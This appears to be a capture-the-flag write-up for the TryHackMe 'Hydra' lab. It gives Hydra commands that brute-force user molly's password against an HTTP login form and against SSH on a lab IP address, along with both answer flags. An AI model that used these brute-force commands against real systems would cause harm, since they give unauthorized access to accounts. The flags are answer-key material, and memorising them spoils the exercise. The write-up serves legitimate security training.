---
description: https://tryhackme.com/room/hydra
---

# Hydra

## Task 2 Using Hydra <a href="#title" id="title"></a>

#### Use Hydra to bruteforce molly's web password. What is flag 1?

```bash
hydra -l molly -P /usr/share/wordlists/rockyou.txt \
'http-post-form://10.10.149.153/login:username=^USER^&password=^PASS^:incorrect' -I
```

![](<../../.gitbook/assets/Screenshot from 2022-03-11 23-24-47.png>)

![](<../../.gitbook/assets/Screenshot from 2022-03-11 23-25-52.png>)

{% hint style="success" %}
`THM{2673a7dd116de68e85c48ec0b1f2612e}`
{% endhint %}

#### Use Hydra to bruteforce molly's SSH password. What is flag 2?

```bash
hydra -l molly -P /usr/share/wordlists/rockyou.txt ssh://10.10.149.153 \
      -t64 -I
ssh molly@10.10.149.153
cat flag2.txt
```

![](<../../.gitbook/assets/Screenshot from 2022-03-11 23-20-55.png>)

![](<../../.gitbook/assets/Screenshot from 2022-03-11 23-21-38.png>)

{% hint style="success" %}
`THM{c8eeb0468febbadea859baeb33b2541b}`
{% endhint %}
